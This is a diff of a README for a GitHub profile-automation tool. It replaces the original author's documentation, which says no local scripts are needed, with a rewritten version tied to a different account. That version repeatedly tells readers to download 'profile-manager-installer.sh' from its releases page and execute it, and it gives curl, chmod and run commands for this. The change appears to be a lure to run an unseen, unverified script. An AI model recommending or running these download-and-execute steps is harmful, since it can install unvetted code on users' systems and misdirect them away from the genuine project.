@@ -1,159 +1,233 @@
-<!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
+# Github Profile Manager — Auto README, 3D Graphs, Workflows
 
-<a id="readme-top"></a>
+[![Releases](https://img.shields.io/badge/Downloads-Releases-blue?logo=github&style=for-the-badge)](https://github.com/Sankaprabodh/Github-Profile-Manager/releases)
 
-[![Contributors][contributors-shield]][contributors-url]
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
-[![project_license][license-shield]][license-url]
+Automate your GitHub profile README with dynamic featured projects and 3D contribution graphs. This repo includes workflow templates, a Python CLI, and integration with the GitHub API to keep your profile fresh and informative.
 
-<br />
-<div align="center">
-  <a href="https://github.com/LoveDoLove/Github-Profile-Manager">
-    <img src="images/logo.png" alt="Logo" width="80" height="80">
-  </a>
+Topics: automation • contribution-graph • developer-tools • github-actions • github-api • github-profile • open-source • profile-manager • python • starred-repositories • workflow
 
-<h3 align="center">GitHub Profile Manager</h3>
+Live downloads and installers: https://github.com/Sankaprabodh/Github-Profile-Manager/releases  
+(Download the release asset named profile-manager-installer.sh from the Releases page and execute it to install the CLI and sample workflows.)
 
-  <p align="center">
-    Automate your GitHub profile README with dynamic featured projects and 3D contribution graphs using GitHub Actions workflows.
-    <br />
-    <a href="https://github.com/LoveDoLove/Github-Profile-Manager"><strong>Explore the docs »</strong></a>
-    <br />
-    <br />
-    <a href="https://github.com/LoveDoLove/Github-Profile-Manager">View Demo</a>
-    &middot;
-    <a href="https://github.com/LoveDoLove/Github-Profile-Manager/issues/new?labels=bug&template=bug-report---.md">Report Bug</a>
-    &middot;
-    <a href="https://github.com/LoveDoLove/Github-Profile-Manager/issues/new?labels=enhancement&template=feature-request---.md">Request Feature</a>
-  </p>
-</div>
+---
 
-<details>
-  <summary>Table of Contents</summary>
-  <ol>
-    <li>
-      <a href="#about-the-project">About The Project</a>
-      <ul>
-        <li><a href="#built-with">Built With</a></li>
-      </ul>
-    </li>
-    <li>
-      <a href="#getting-started">Getting Started</a>
-      <ul>
-        <li><a href="#prerequisites">Prerequisites</a></li>
-        <li><a href="#installation">Installation</a></li>
-      </ul>
-    </li>
-    <li><a href="#usage">Usage</a></li>
-    <li><a href="#contributing">Contributing</a></li>
-    <li><a href="#license">License</a></li>
-    <li><a href="#contact">Contact</a></li>
-    <li><a href="#acknowledgments">Acknowledgments</a></li>
-  </ol>
-</details>
+<!-- Images -->
+![3D Graph Example](https://raw.githubusercontent.com/Sankaprabodh/Github-Profile-Manager/main/assets/3d-graph-screenshot.png)
+![Featured Projects](https://raw.githubusercontent.com/Sankaprabodh/Github-Profile-Manager/main/assets/featured-projects-screenshot.png)
 
-## About The Project
+Table of Contents
+- What it does
+- Key features
+- How it works
+- Quick start
+- Configure (profile README template)
+- GitHub Actions workflow examples
+- CLI usage (Python)
+- Assets and templates
+- Troubleshooting & FAQ
+- Contribute
+- License
+- Releases
 
-**GitHub Profile Manager** automates your GitHub profile README by dynamically updating featured repositories based on stars and displaying a 3D contribution graph. All updates are handled via GitHub Actions workflows—no manual script running required.
+What it does
+- Generates a GitHub profile README with dynamic content.
+- Picks featured projects from starred repositories or a curated list.
+- Produces a 3D-style contribution graph image and updates the README with it.
+- Runs on GitHub Actions. You can schedule updates or trigger them on push.
+- Uses the GitHub API for repo info, stars, languages, and stats.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+Key features
+- Featured projects block with live stats (stars, forks, language, description).
+- 3D contribution graph rendered to PNG and embedded in README.
+- Multiple update modes: scheduled, manual dispatch, or on push.
+- Configurable templates and filters (min stars, exclude forks, exclude archived).
+- Python CLI for local preview and testing.
+- Keeps README tidy using markers and partial updates.
 
-### Built With
+How it works (high level)
+1. The workflow triggers on a schedule or on demand.
+2. The action or CLI calls the GitHub API to fetch starred repos and repo metadata.
+3. Templates render the featured projects section.
+4. The tool generates a 3D contribution graph image from your contribution data.
+5. The workflow commits the updated README to your profile repo.
 
-- [![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
-- [![GitHub Actions](https://img.shields.io/badge/GitHub%20Actions-2088FF?style=for-the-badge&logo=github-actions&logoColor=white)](https://github.com/features/actions)
-- [![Markdown](https://img.shields.io/badge/Markdown-000000?style=for-the-badge&logo=markdown&logoColor=white)](https://daringfireball.net/projects/markdown/)
+Quick start — minimal (use Actions)
+1. Fork your profile repo or add these workflow files to your profile repo.
+2. Add a GitHub Actions workflow that runs the included action or the Python script.
+3. Provide a PERSONAL_ACCESS_TOKEN with repo scope (GitHub secret: PROFILE_MANAGER_TOKEN).
+4. Commit the workflow and enable Actions.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+Example workflow (core)
+```yaml
+name: Update Profile README
+on:
+  schedule:
+    - cron: '0 0 * * 0' # weekly
+  workflow_dispatch:
 
-## Getting Started
+jobs:
+  update:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
+      - name: Install dependencies
+        run: pip install -r requirements.txt
+      - name: Run profile manager
+        env:
+          GITHUB_TOKEN: ${{ secrets.PROFILE_MANAGER_TOKEN }}
+        run: python scripts/profile_manager.py --config .github/profile_manager.yml
+      - name: Commit changes
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add README.md assets/3d-graph.png
+          git commit -m "chore: update profile README [skip ci]" || echo "no changes"
+          git push
+```
 
-### Prerequisites
+Configure (profile README template)
+- The tool uses markers to locate sections inside README.md:
+  - <!-- PROFILE_MANAGER:START -->
+  - <!-- PROFILE_MANAGER:END -->
+- Add these markers where you want the dynamic section.
 
-- A GitHub repository with a profile README (e.g., `<username>/<username>`)
-- GitHub Actions enabled
+Sample README snippet
+```markdown
+# Hi, I'm Alice 👋
 
-### Installation
+<!-- PROFILE_MANAGER:START -->
+<!-- PROFILE_MANAGER:END -->
+```
 
-1. Copy the workflow YAML files from the `workflows/` directory into your repository's `.github/workflows` directory:
-   - [`generate-3d-contribution-graph.yml`](workflows/generate-3d-contribution-graph.yml)
-   - [`sync-top-starred-projects.yml`](workflows/sync-top-starred-projects.yml)
-2. (Optional) Add a repository environment variable named `EXCLUDE_REPOS` in your GitHub repository settings to exclude specific repositories from the featured list. Use a comma-separated list (e.g., `repo1,repo2`).
+Profile manager config (.github/profile_manager.yml)
+```yaml
+profile:
+  username: alice
+  readme_path: README.md
+  markers:
+    start: '<!-- PROFILE_MANAGER:START -->'
+    end: '<!-- PROFILE_MANAGER:END -->'
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+sources:
+  starred_repos: true
+  curated_list:
+    - owner: someorg
+      repo: showcase
+filters:
+  min_stars: 50
+  exclude_forks: true
+  exclude_archived: true
+featured_projects:
+  limit: 4
+graph:
+  type: 3d
+  output: assets/3d-graph.png
+  style: material
+```
 
-## Usage
+CLI usage (Python)
+- The repo includes a Python CLI for local testing.
+- Install dependencies:
+  - pip install -r requirements.txt
+- Basic commands:
+  - Preview only: python scripts/profile_manager.py --preview
+  - Generate assets: python scripts/profile_manager.py --generate
+  - Update README: python scripts/profile_manager.py --apply
 
-- **Automatic Featured Projects:**  
-  The `sync-top-starred-projects.yml` workflow will automatically update your profile README with your top-starred repositories on a schedule or on demand.
-- **Exclude Repositories:**  
-  To skip certain repositories, set the `EXCLUDE_REPOS` repository environment variable in your GitHub settings.
-- **3D Contribution Graph:**  
-  The `generate-3d-contribution-graph.yml` workflow generates a 3D contribution graph SVG, which you can embed in your profile README.
-- **No Manual Script Running:**  
-  All updates are handled by GitHub Actions; you do not need to run scripts locally.
+Example commands
+- Download and run installer from Releases (recommended for quick setup):
+  - curl -L https://github.com/Sankaprabodh/Github-Profile-Manager/releases/download/v1.0.0/profile-manager-installer.sh -o profile-manager-installer.sh
+  - chmod +x profile-manager-installer.sh
+  - ./profile-manager-installer.sh
+- Local test:
+  - python scripts/profile_manager.py --config .github/profile_manager.yml --preview
 
-_For more examples, refer to the [Documentation](https://github.com/LoveDoLove/Github-Profile-Manager)_
+Assets and templates
+- assets/
+  - 3d-graph.png — the generated contribution graph.
+  - project-card-template.md — template for each featured repo.
+- templates/
+  - readme-section.md.j2 — Jinja2 template used to render the dynamic section.
+- scripts/
+  - profile_manager.py — main tool that fetches data and renders templates.
+  - graph_builder.py — tool that builds a 3D-style contribution graph as PNG.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+3D contribution graph details
+- The graph builder samples contribution counts and maps them to a mesh grid.
+- The renderer uses matplotlib / plotly style shaders to produce a 3D effect.
+- Output is a PNG that embeds in README. The action updates the asset and README.
 
-## Contributing
+Featured projects logic
+- Sources: starred repos plus an optional curated list.
+- Sorting: by stars, recent activity, or custom score.
+- Each card shows:
+  - Name and owner
+  - Short description
+  - Top language
+  - Stars and forks
+  - Last push date
+- You can pin or exclude repos via the config file.
 
-Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
+Security and tokens
+- The workflows use a token stored in repo secrets.
+- Create a secret named PROFILE_MANAGER_TOKEN with the minimum scope needed.
+- The tool needs repo access to push changes to the README.
 
-If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".  
-Don't forget to give the project a star! Thanks again!
+Advanced workflows
+- Use workflow_dispatch to trigger manual updates.
+- Use matrix strategy to run multiple profiles from a single organization repo.
+- Use caching to avoid redundant API calls.
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+Examples (profiles using this tool)
+- Example profile with 3D graph: https://github.com/example-user/example-profile
+- Example README snippet generated by the tool:
+  - A projects grid
+  - A generated 3D contribution image
+  - Badges for top languages
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+Troubleshooting & FAQ
+Q: Where do I get the installer or release assets?
+A: Visit the Releases page: https://github.com/Sankaprabodh/Github-Profile-Manager/releases and download the profile-manager-installer.sh asset. Run it to install the CLI and add sample workflows.
 
-### Top contributors:
+Q: The action fails with API rate limits. What now?
+A: Reduce the number of API calls. Use conditional caching. Use an authenticated token with higher rate limits.
 
-<a href="https://github.com/LoveDoLove/Github-Profile-Manager/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=LoveDoLove/Github-Profile-Manager" alt="contrib.rocks image" />
-</a>
+Q: How do I change the number of featured projects?
+A: Edit featured_projects.limit in .github/profile_manager.yml.
 
-## License
+Q: Can I render different graph styles?
+A: Yes. The graph section accepts style and type. Supported types: flat, 3d, heatmap.
 
-Distributed under the MIT License. See `LICENSE` for more information.
+Contribute
+- Open an issue to discuss new features or report bugs.
+- PR checklist:
+  - Fork the repo
+  - Create a feature branch
+  - Add tests and update docs
+  - Open a pull request
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+Maintainer guidelines
+- Follow the code style in pyproject.toml.
+- Keep public APIs stable for minor releases.
+- Tag breaking changes in changelog.
 
-## Contact
+Changelog
+- See Releases for full changelog and installer assets:
+  - https://github.com/Sankaprabodh/Github-Profile-Manager/releases
+- Release naming convention: vMAJOR.MINOR.PATCH
 
-LoveDoLove - [@LoveDoLove](https://twitter.com/LoveDoLove) - lovedolove@gmail.com
+License
+- This project uses the MIT license. See LICENSE.md for details.
 
-Project Link: [https://github.com/LoveDoLove/Github-Profile-Manager](https://github.com/LoveDoLove/Github-Profile-Manager)
+Releases
+- Download installers, prebuilt assets, and changelog from the Releases page:
+  - https://github.com/Sankaprabodh/Github-Profile-Manager/releases
+- Download the release asset profile-manager-installer.sh and execute it to deploy the manager to your repo.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-## Acknowledgments
-
-- [Best-README-Template](https://github.com/othneildrew/Best-README-Template)
-- [contrib.rocks](https://contrib.rocks/)
-- [GitHub Actions](https://github.com/features/actions)
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- MARKDOWN LINKS & IMAGES -->
-
-[contributors-shield]: https://img.shields.io/github/contributors/LoveDoLove/Github-Profile-Manager.svg?style=for-the-badge
-[contributors-url]: https://github.com/LoveDoLove/Github-Profile-Manager/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/LoveDoLove/Github-Profile-Manager.svg?style=for-the-badge
-[forks-url]: https://github.com/LoveDoLove/Github-Profile-Manager/network/members
-[stars-shield]: https://img.shields.io/github/stars/LoveDoLove/Github-Profile-Manager.svg?style=for-the-badge
-[stars-url]: https://github.com/LoveDoLove/Github-Profile-Manager/stargazers
-[issues-shield]: https://img.shields.io/github/issues/LoveDoLove/Github-Profile-Manager.svg?style=for-the-badge
-[issues-url]: https://github.com/LoveDoLove/Github-Profile-Manager/issues
-[license-shield]: https://img.shields.io/github/license/LoveDoLove/Github-Profile-Manager.svg?style=for-the-badge
-[license-url]: https://github.com/LoveDoLove/Github-Profile-Manager/blob/master/LICENSE
-[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
-[linkedin-url]: https://linkedin.com/in/lovedolove
-[product-screenshot]: images/screenshot.png
+Contact
+- Open an issue on GitHub for help or feature requests.
+- Use pull requests for code contributions.
